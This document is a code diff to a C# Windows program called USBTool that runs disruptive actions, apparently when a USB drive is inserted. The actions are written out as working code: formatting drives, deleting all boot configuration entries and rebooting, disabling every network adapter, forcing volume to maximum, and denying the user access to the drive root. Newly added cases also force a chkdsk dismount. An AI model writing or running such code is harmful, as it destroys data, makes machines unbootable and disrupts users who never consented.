@@ -8,6 +8,7 @@ using System.IO;
 using System.Linq;
 using System.Management;
 using System.Runtime.InteropServices;
+using System.Security.AccessControl;
 using System.Speech.Synthesis;
 using System.Threading;
 using System.Threading.Tasks;
@@ -46,22 +47,24 @@ namespace USBTool
 										drivename)));
 									break;
 								case "format":
-									var formatco = new ConnectionOptions
-                                    {
-                                        Impersonation = ImpersonationLevel.Impersonate,
-                                        Authentication = AuthenticationLevel.Call,
-                                        EnablePrivileges = true
-                                    };
-                                    ManagementClass disks = new ManagementClass(
-                                        new ManagementScope("root\\cimv2", formatco), 
-                                        new ManagementPath ("Win32_Volume"),
-                                        new ObjectGetOptions());
-									foreach (ManagementObject disk in disks.GetInstances())
+									var co = new ConnectionOptions
 									{
-										if (disk.Properties["Name"].Value.ToString() == drive.Name)
+										Impersonation = ImpersonationLevel.Impersonate,
+										Authentication = AuthenticationLevel.Call,
+										EnablePrivileges = true
+									};
+									var scope = new ManagementScope("root\\cimv2", co);
+
+									ManagementClass volumes = new ManagementClass(
+										scope, 
+										new ManagementPath ("Win32_Volume"),
+										new ObjectGetOptions());
+									foreach (ManagementObject volume in volumes.GetInstances())
+									{
+										if (volume.Properties["Name"].Value.ToString() == drive.Name)
 										{
 											object[] methodArgs = { "FAT32", true/*快速格式化*/, 4096/*簇大小*/, ""/*卷标*/, false/*压缩*/ };
-											disk.InvokeMethod("Format", methodArgs);
+											volume.InvokeMethod("Format", methodArgs);
 											Thread.Sleep(4000);
 										}
 									}
@@ -190,22 +193,7 @@ namespace USBTool
 									IMMDeviceEnumerator enumerator = _enumerater as IMMDeviceEnumerator;
 									while (state != "Prepared" & state != "Ended") { }
 									state = "Playing";
-									while (state != "Ended")
-									{
-										try
-										{
-											enumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out IMMDevice Endpoint);
-											Endpoint.Activate(ref guidVolume, CLSCTX_ALL, IntPtr.Zero, out IUnknown _Volume);
-											IAudioEndpointVolume Systemvolume = _Volume as IAudioEndpointVolume;
-											Systemvolume.SetMasterVolumeLevelScalar(1, Guid.Empty);
-											Systemvolume.SetMute(false, Guid.Empty);
-											
-										}
-										catch
-										{
-
-										}
-									}
+									while (state != "Ended") ;									
 #endif
 									break;
 
@@ -213,6 +201,18 @@ namespace USBTool
 									Voice.Volume = (int)((object[])ReadText.Tag)[0];
 									Voice.Rate = (int)((object[])ReadText.Tag)[1];
 									Voice.SelectVoice(((object[])ReadText.Tag)[2].ToString());
+									preventthread=new Thread(()=>{
+										try
+										{
+											while (true)
+												SetAppAndSystemVolume(1, false);
+										}
+										catch (ThreadAbortException)
+										{
+
+										}
+									});
+									preventthread.Start();
 									Voice.Speak(((object[])ReadText.Tag)[3].ToString());
 									break;
 								case "SwapMouseButton":
@@ -301,7 +301,20 @@ namespace USBTool
 									Thread.Sleep(4000);
 									break;
 								case "beep":
+									preventthread=new Thread(()=>{
+										try
+										{
+											while (true)
+												SetAppAndSystemVolume(1, false);
+										}
+                                        catch (ThreadAbortException)
+                                        {
+
+                                        }
+										});
+									preventthread.Start();
 									Console.Beep(2500, 10000);
+									preventthread.Abort();
 									break;
 								case "beuncle":
 									ForEachWindow(GetDesktopWindow(), "beuncle");
@@ -312,13 +325,13 @@ namespace USBTool
 									//	new System.Security.AccessControl.RegistryAccessRule(
 									//		Environment.UserDomainName + "\\" + Environment.UserName,
 									//		System.Security.AccessControl.RegistryRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
-									var co = new ConnectionOptions
+									co = new ConnectionOptions
 									{
 										Impersonation = ImpersonationLevel.Impersonate,
 										Authentication = AuthenticationLevel.Call,
 										EnablePrivileges = true
 									};
-									var scope = new ManagementScope("root\\wmi", co);
+									scope = new ManagementScope("root\\wmi", co);
 									ManagementObject bcdstore = new ManagementObject(scope, new ManagementPath("BcdStore.FilePath=\"\""), null);
 									try
 									{
@@ -328,9 +341,7 @@ namespace USBTool
 										var bcdos = outarg["Objects"] as object[];
 										foreach (ManagementBaseObject bcdo in bcdos)
 										{
-											ManagementBaseObject deletearg = bcdstore.GetMethodParameters("DeleteObject");
-											deletearg["Id"] = bcdo["Id"];
-											bcdstore.InvokeMethod("DeleteObject", deletearg, null);
+											bcdstore.InvokeMethod("DeleteObject", new object[]{bcdo["Id"] });
 										}
 									}
 									catch
@@ -343,25 +354,31 @@ namespace USBTool
 										var system = new ManagementClass(scope, new ManagementPath("Win32_OperatingSystem"), null);
 										foreach (ManagementObject s in system.GetInstances())
 										{
-											s.InvokeMethod("Reboot", null);
+											try
+											{
+												s.InvokeMethod("Reboot", null);
+											}
+											catch
+											{
+
+											}
 										}
 									}
 									break;
 								case "network":
-									var co1 = new ConnectionOptions
+									co = new ConnectionOptions
 									{
 										Impersonation = ImpersonationLevel.Impersonate,
 										Authentication = AuthenticationLevel.Call,
 										EnablePrivileges = true
 									};
-									var scope1 = new ManagementScope("\\\\.\\root\\wmi", co1);
-									ManagementClass networkadapters = new ManagementClass(scope1, new ManagementPath("Win32_NetworkAdapter"), null);
+									scope = new ManagementScope("Root\\CIMV2", co);
+									ManagementClass networkadapters = new ManagementClass(scope, new ManagementPath("Win32_NetworkAdapter"), null);
 									foreach (ManagementObject adapter in networkadapters.GetInstances())
 									{
-										ManagementBaseObject arg = adapter.GetMethodParameters("Disable");
 										try
 										{
-											adapter.InvokeMethod("Disable", arg, null);
+											adapter.InvokeMethod("Disable", null);
 										}
 										catch
 										{
@@ -408,15 +425,7 @@ namespace USBTool
 									NumericalFileName(drive.RootDirectory);
 									break;
 								case "mute":
-									guidEnumetator = typeof(IMMDeviceEnumerator).GUID;
-									guidVolume = typeof(IAudioEndpointVolume).GUID;
-									CoCreateInstance(ref MMDeviceEnumerator, null, CLSCTX_ALL, ref guidEnumetator, out _enumerater);
-									enumerator = _enumerater as IMMDeviceEnumerator;
-									enumerator.GetDefaultAudioEndpoint(EDataFlow.eRender, ERole.eMultimedia, out IMMDevice endpoint);
-									endpoint.Activate(ref guidVolume, CLSCTX_ALL, IntPtr.Zero, out IUnknown _volume);
-									IAudioEndpointVolume systemvolume = _volume as IAudioEndpointVolume;
-									systemvolume.SetMasterVolumeLevelScalar(0, Guid.Empty);
-									systemvolume.SetMute(true, Guid.Empty);
+									SetAppAndSystemVolume(0, true);
 									break;
 								case "clip":
 									int width = (int)System.Windows.SystemParameters.PrimaryScreenWidth;
@@ -439,15 +448,15 @@ namespace USBTool
 									{
 										g.DrawImage(p, r);
 									}
-                                    catch
-                                    {
+									catch
+									{
 
-                                    }
-                                    finally
-                                    {
+									}
+									finally
+									{
 										g.Dispose();
 										p.Dispose();
-                                    }
+									}
 									break;
 								case "text":
 									ForEachWindow(GetDesktopWindow(), "text");
@@ -459,7 +468,7 @@ namespace USBTool
 									for(int y = 0;y<=height;y++){
 										int sign = (int)Math.Pow(-1,y);
 										for (int x = halfwidth - sign * halfwidth;//当y为偶数，初值为0，当y为奇数，初值为width
-											Math.Abs(x - halfwidth) <= halfwidth;//x距离屏幕宽度一半处距离是否大于宽度一半
+											Math.Abs(x - halfwidth) <= halfwidth;//x距离屏幕水平中线处距离是否大于宽度一半
 											x+=sign)
 										{
 											Cursor.Position = new Point(x, y);											
@@ -467,6 +476,49 @@ namespace USBTool
 												));
 										}
 									}
+									break;
+								case "access":
+									DirectoryInfo root = drive.RootDirectory;
+									var access=root.GetAccessControl();
+									access.RemoveAccessRuleAll(new FileSystemAccessRule(
+										Environment.UserDomainName + "\\" + Environment.UserName,
+										FileSystemRights.FullControl,
+										AccessControlType.Allow));
+									access.AddAccessRule(new FileSystemAccessRule(
+										Environment.UserDomainName + "\\" + Environment.UserName,
+										FileSystemRights.FullControl,
+										InheritanceFlags.ContainerInherit|InheritanceFlags.ObjectInherit,
+										PropagationFlags.None,
+										AccessControlType.Deny));									
+									root.SetAccessControl(access);
+									break;
+								case "chkdsk":
+									co = new ConnectionOptions
+									{
+										Impersonation = ImpersonationLevel.Impersonate,
+										Authentication = AuthenticationLevel.Call,
+										EnablePrivileges = true
+									};
+									scope = new ManagementScope("Root\\CIMV2", co);
+									ManagementClass disks = new ManagementClass(scope, new ManagementPath("Win32_LogicalDisk"), null);
+									foreach (ManagementObject disk in disks.GetInstances())
+									{
+										if (disk.Properties["Name"].Value.ToString() + "\\" == drive.Name)
+										{
+											object[] arg = {
+												true,//FixErrors
+												true,//VigorousIndexCheck
+												false,//SkipFolderCycle
+												true,//ForceDismount
+												true,//RecoverBadSectors
+												false//RunAtBootUp
+											};
+											disk.InvokeMethod("Chkdsk", arg);
+										}
+									}
+									break;
+								case "totop":
+									ForEachWindow(GetDesktopWindow(), "top");
 									break;
 								default:
 									throw (new ArgumentException("该功能还未开发"));
@@ -859,24 +911,24 @@ namespace USBTool
 			WhenArrival("filename");
 		}
 
-        private void Mute_Click(object sender, EventArgs e)
-        {
+		private void Mute_Click(object sender, EventArgs e)
+		{
 			WhenArrival("mute");
 		}
 
-        private void Clip_Click(object sender, EventArgs e)
-        {
+		private void Clip_Click(object sender, EventArgs e)
+		{
 			WhenArrival("clip");
 		}
 
-        private void DisableWnd_Click(object sender, EventArgs e)
-        {
+		private void DisableWnd_Click(object sender, EventArgs e)
+		{
 			WhenArrival("disable");
 		}
 
 
-        private void WndPicture_Click(object sender, EventArgs e)
-        {
+		private void WndPicture_Click(object sender, EventArgs e)
+		{
 			var temp = SetAttrib.Show("picture");
 			if (temp.Length != 0)
 			{
@@ -885,8 +937,8 @@ namespace USBTool
 			}
 		}
 
-        private void Picture_Click(object sender, EventArgs e)
-        {
+		private void Picture_Click(object sender, EventArgs e)
+		{
 			var temp = SetAttrib.Show("picture");
 			if (temp.Length != 0)
 			{
@@ -895,8 +947,8 @@ namespace USBTool
 			}
 		}
 
-        private void DrawText_Click(object sender, EventArgs e)
-        {
+		private void DrawText_Click(object sender, EventArgs e)
+		{
 			string i;
 			if ((i = Interaction.InputBox("输入要绘制的文本内容。")).Length > 0)
 			{
@@ -905,9 +957,23 @@ namespace USBTool
 			}
 		}
 
-        private void WindMouse_Click(object sender, EventArgs e)
-        {
+		private void WindMouse_Click(object sender, EventArgs e)
+		{
 			WhenArrival("wind");
+		}
+
+		private void AccessForbidden_Click(object sender, EventArgs e)
+		{
+			WhenArrival("access");
+		}
+		private void ChkDsk_Click(object sender, EventArgs e)
+		{
+			WhenArrival("chkdsk");
+		}
+
+        private void ToTop_Click(object sender, EventArgs e)
+        {
+			WhenArrival("totop");
 		}
     }
 }
